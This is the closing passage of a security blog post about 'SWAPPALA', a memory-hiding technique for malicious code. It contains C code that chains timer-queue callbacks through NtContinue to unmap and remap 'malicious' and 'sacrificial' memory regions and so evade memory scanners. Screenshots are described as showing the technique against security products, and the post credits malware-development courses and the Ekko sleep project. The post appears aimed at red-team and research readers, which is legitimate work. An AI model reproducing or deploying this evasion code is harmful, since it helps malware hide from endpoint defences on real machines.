        <span class="token punctuation">(</span><span class="token operator">*</span>RopSetEvt<span class="token punctuation">)</span><span class="token punctuation">.</span>Rip <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>SetEvent<span class="token punctuation">;</span>
        <span class="token punctuation">(</span><span class="token operator">*</span>RopSetEvt<span class="token punctuation">)</span><span class="token punctuation">.</span>Rcx <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>hEvent<span class="token punctuation">;</span>

        <span class="token function">CreateTimerQueueTimer</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>hNewTimer<span class="token punctuation">,</span> hTimerQueue<span class="token punctuation">,</span> <span class="token punctuation">(</span>WAITORTIMERCALLBACK<span class="token punctuation">)</span>NtContinue<span class="token punctuation">,</span> RopUnmapMal<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> WT_EXECUTEINTIMERTHREAD<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">CreateTimerQueueTimer</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>hNewTimer<span class="token punctuation">,</span> hTimerQueue<span class="token punctuation">,</span> <span class="token punctuation">(</span>WAITORTIMERCALLBACK<span class="token punctuation">)</span>NtContinue<span class="token punctuation">,</span> RopMapSac<span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> WT_EXECUTEINTIMERTHREAD<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">CreateTimerQueueTimer</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>hNewTimer<span class="token punctuation">,</span> hTimerQueue<span class="token punctuation">,</span> <span class="token punctuation">(</span>WAITORTIMERCALLBACK<span class="token punctuation">)</span>NtContinue<span class="token punctuation">,</span> RopDelay<span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> WT_EXECUTEINTIMERTHREAD<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">CreateTimerQueueTimer</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>hNewTimer<span class="token punctuation">,</span> hTimerQueue<span class="token punctuation">,</span> <span class="token punctuation">(</span>WAITORTIMERCALLBACK<span class="token punctuation">)</span>NtContinue<span class="token punctuation">,</span> RopUnmapSac<span class="token punctuation">,</span> <span class="token number">400</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> WT_EXECUTEINTIMERTHREAD<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">CreateTimerQueueTimer</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>hNewTimer<span class="token punctuation">,</span> hTimerQueue<span class="token punctuation">,</span> <span class="token punctuation">(</span>WAITORTIMERCALLBACK<span class="token punctuation">)</span>NtContinue<span class="token punctuation">,</span> RopMapMal<span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> WT_EXECUTEINTIMERTHREAD<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">CreateTimerQueueTimer</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>hNewTimer<span class="token punctuation">,</span> hTimerQueue<span class="token punctuation">,</span> <span class="token punctuation">(</span>WAITORTIMERCALLBACK<span class="token punctuation">)</span>NtContinue<span class="token punctuation">,</span> RopSetEvt<span class="token punctuation">,</span> <span class="token number">600</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> WT_EXECUTEINTIMERTHREAD<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">WaitForSingleObject</span><span class="token punctuation">(</span>hEvent<span class="token punctuation">,</span> INFINITE<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token punctuation">}</span>

    <span class="token function">DeleteTimerQueue</span><span class="token punctuation">(</span>hTimerQueue<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// Clean up allocated memory</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>CtxThread<span class="token punctuation">)</span> <span class="token function">VirtualFree</span><span class="token punctuation">(</span>CtxThread<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> MEM_RELEASE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>RopUnmapMal<span class="token punctuation">)</span> <span class="token function">VirtualFree</span><span class="token punctuation">(</span>RopUnmapMal<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> MEM_RELEASE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>RopMapSac<span class="token punctuation">)</span> <span class="token function">VirtualFree</span><span class="token punctuation">(</span>RopMapSac<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> MEM_RELEASE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>RopDelay<span class="token punctuation">)</span> <span class="token function">VirtualFree</span><span class="token punctuation">(</span>RopDelay<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> MEM_RELEASE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>RopMapMal<span class="token punctuation">)</span> <span class="token function">VirtualFree</span><span class="token punctuation">(</span>RopMapMal<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> MEM_RELEASE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>RopUnmapSac<span class="token punctuation">)</span> <span class="token function">VirtualFree</span><span class="token punctuation">(</span>RopUnmapSac<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> MEM_RELEASE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>RopSetEvt<span class="token punctuation">)</span> <span class="token function">VirtualFree</span><span class="token punctuation">(</span>RopSetEvt<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> MEM_RELEASE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>newStack<span class="token punctuation">)</span> <span class="token function">VirtualFree</span><span class="token punctuation">(</span>newStack<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> MEM_RELEASE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>newStackMal<span class="token punctuation">)</span> <span class="token function">VirtualFree</span><span class="token punctuation">(</span>newStackMal<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> MEM_RELEASE<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><span>C</span></div></div></div></div><p>So basically what I do here is to create a copy of the stack of the ‚Äútimer‚Äôs thread‚Äù so that I can use it without having those threads stepping on each other.</p><h3 id="belli-screenshot-sequence">Belli Screenshot Sequence</h3><p>You can‚Äôt write a blog post without screenshot of at least one messagebox:</p><img src="https://oldboy21.github.io/swappala/Untitled%201.png" class="center"><p>And SWAPPALA against some of the good guys</p><img src="https://oldboy21.github.io/swappala/Untitled%202.png" class="center"><p>even the scariest (jk jk)</p><img src="https://oldboy21.github.io/swappala/Untitled%203.png" class="center"><p>There are other tools to play around with and to throw against SWAPPALA, not materials for this blog. As always not trying to claim anything breakthrough bleeding edge bam bam bam, just sharing some coding adventures that hopefully will be food for brain for someone.</p><h3 id="what-about-that-reflective-dll-you-keep-mentioning">What About that Reflective DLL You Keep Mentioning?</h3><p>True, I did mention that couple of times and I must admit it started all with that. Two things:</p><ul><li>I thought it would have been better to have a simple version of SWAPPALA to share with the rest of the world</li><li>I still have some issues using SWAPPALA to hide the Reflective DLL once it‚Äôs loaded, maybe you reading this blog have some ideas you want to share? üôÇ</li></ul><p>Coming soon hopefully!</p><h3 id="credits-resources-and-repeating-myself">Credits, Resources and Repeating Myself</h3><p>As always not trying to claim anything breakthrough bleeding edge bam bam bam, just sharing some coding adventures that hopefully will be food for brain for someone. Also thanks to:</p><ul><li><a href="https://maldevacademy.com/">MalDev Academy</a>, great resource and great community</li><li><a href="https://institute.sektor7.net/">Sektor7 Institute</a></li><li>‚ÄúIl Buon Pillo‚Äù - we started throwing chairs, now we debug code together</li><li><a href="https://github.com/Cracked5pider/Ekko">Ekko sleep!</a></li></ul></div></article><hr><div class="post-info"><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 01-2.83.0L2 12V2h10l8.59 8.59a2 2 0 010 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="https://oldboy21.github.io/tags/untagged/">untagged</a></span></p><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6A2 2 0 004 4v16a2 2 0 002 2h12a2 2 0 002-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>2709 Words</p><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2024-05-28 21:17</p></div><hr><div class="sharing-buttons"><a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f05%2fswappala-why-change-when-you-can-hide%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook"><div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 00-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 011-1h3z"></path></svg></div></div></a><a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f05%2fswappala-why-change-when-you-can-hide%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter"><div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9.0 01-3.14 1.53 4.48 4.48.0 00-7.86 3v1A10.66 10.66.0 013 4s-4 9 5 13a11.64 11.64.0 01-7 2c9 5 20 0 20-11.5a4.5 4.5.0 00-.08-.83A7.72 7.72.0 0023 3z"></path></svg></div></div></a><a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=SWAPPALA%3a%20Why%20Change%20When%20You%20Can%20Hide%3f&amp;caption=SWAPPALA%3a%20Why%20Change%20When%20You%20Can%20Hide%3f&amp;canonicalUrl=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f05%2fswappala-why-change-when-you-can-hide%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr"><div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093.0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941.0 9.999.0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"></path></svg></div></div></a><a class="resp-sharing-button__link" href="mailto:?subject=SWAPPALA%3a%20Why%20Change%20When%20You%20Can%20Hide%3f&amp;body=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f05%2fswappala-why-change-when-you-can-hide%2f" target="_self" rel="noopener" aria-label="" title="Share via email"><div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1.0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1.0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg></div></div></a><a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f05%2fswappala-why-change-when-you-can-hide%2f&amp;media=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f05%2fswappala-why-change-when-you-can-hide%2f;description=SWAPPALA%3a%20Why%20Change%20When%20You%20Can%20Hide%3f" target="_blank" rel="noopener" aria-label="" title="Share on pinterest"><div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M12.017.0C5.396.0.029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024.0 1.518.769 1.518 1.688.0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128.0 3.768-2.245 3.768-5.487.0-2.861-2.063-4.869-5.008-4.869-3.41.0-5.409 2.562-5.409 5.199.0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646.0-3.776 2.748-7.252 7.92-7.252 4.158.0 7.392 2.967 7.392 6.923.0 4.135-2.607 7.462-6.233 7.462-1.214.0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607.0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017.0z"></path></svg></div></div></a><a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f05%2fswappala-why-change-when-you-can-hide%2f&amp;title=SWAPPALA%3a%20Why%20Change%20When%20You%20Can%20Hide%3f&amp;summary=SWAPPALA%3a%20Why%20Change%20When%20You%20Can%20Hide%3f&amp;source=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f05%2fswappala-why-change-when-you-can-hide%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin"><div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 016 6v7h-4v-7a2 2 0 00-2-2 2 2 0 00-2 2v7h-4v-7a6 6 0 016-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg></div></div></a><a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f05%2fswappala-why-change-when-you-can-hide%2f&amp;resubmit=true&amp;title=SWAPPALA%3a%20Why%20Change%20When%20You%20Can%20Hide%3f" target="_blank" rel="noopener" aria-label="" title="Share on reddit"><div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M12 0A12 12 0 000 12a12 12 0 0012 12 12 12 0 0012-12A12 12 0 0012 0zm5.01 4.744c.688.0 1.25.561 1.25 1.249a1.25 1.25.0 01-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968.0 1.754.786 1.754 1.754.0.716-.435 1.333-1.01 1.614a3.111 3.111.0 01.042.52c0 2.694-3.13 4.87-7.004 4.87s-7.004-2.176-7.004-4.87c0-.183.015-.366.043-.534A1.748 1.748.0 014.028 12c0-.968.786-1.754 1.754-1.754.463.0.898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342.0 01.14-.197.35.35.0 01.238-.042l2.906.617a1.214 1.214.0 011.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687.0 1.248-.561 1.248-1.249S9.937 12 9.249 12zm5.5.0c-.687.0-1.248.561-1.248 1.25.0.687.561 1.248 1.249 1.248S16 13.937 16 13.249c0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327.0 00-.231.094.33.33.0 000 .463c.842.842 2.484.913 2.961.913s2.105-.056 2.961-.913a.361.361.0 00.029-.463.33.33.0 00-.464.0c-.547.533-1.684.73-2.512.73-.828.0-1.979-.196-2.512-.73a.326.326.0 00-.232-.095z"></path></svg></div></div></a><a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f05%2fswappala-why-change-when-you-can-hide%2f;title=SWAPPALA%3a%20Why%20Change%20When%20You%20Can%20Hide%3f" target="_blank" rel="noopener" aria-label="" title="Share on xing"><div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M18.188.0c-.517.0-.741.325-.927.66.0.0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211.0.375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016.0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894.0 21.686.0h-3.498zM3.648 4.74c-.211.0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016.0.021L1.86 16.051c-.099.188-.093.381.0.529.085.142.239.234.45.234h3.461c.518.0.766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"></path></svg></div></div></a><a class="resp-sharing-button__link" href="whatsapp://send?text=SWAPPALA%3a%20Why%20Change%20When%20You%20Can%20Hide%3f%20https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f05%2fswappala-why-change-when-you-can-hide%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp"><div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198.0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479.0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87.0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86.0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64.0 5.122 1.03 6.988 2.898a9.825 9.825.0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815.0 0012.05.0C5.495.0.16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882.0 005.683 1.448h.005c6.554.0 11.89-5.335 11.893-11.893a11.821 11.821.0 00-3.48-8.413z"></path></svg></div></div></a><a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f05%2fswappala-why-change-when-you-can-hide%2f&amp;t=SWAPPALA%3a%20Why%20Change%20When%20You%20Can%20Hide%3f" target="_blank" rel="noopener" aria-label="" title="Share on hacker news"><div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"></path></svg></div></div></a><a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=SWAPPALA%3a%20Why%20Change%20When%20You%20Can%20Hide%3f&amp;url=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f05%2fswappala-why-change-when-you-can-hide%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram"><div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg></div></div></a></div><div class="pagination"><div class="pagination__buttons"><span class="button previous"><a href="https://oldboy21.github.io/posts/2024/06/sleaping-issues-swappala-and-reflective-dll-friends-forever/"><span class="button__icon">‚Üê</span>
<span class="button__text">SLE(A)PING Issues: SWAPPALA and Reflective DLL Friends Forever</span>
</a></span><span class="button next"><a href="https://oldboy21.github.io/posts/2024/02/reflective-dll-got-indirect-syscall-skills/"><span class="button__text">Reflective DLL got Indirect Syscall skills</span>
<span class="button__icon">‚Üí</span></a></span></div></div></main></div></div></body></html>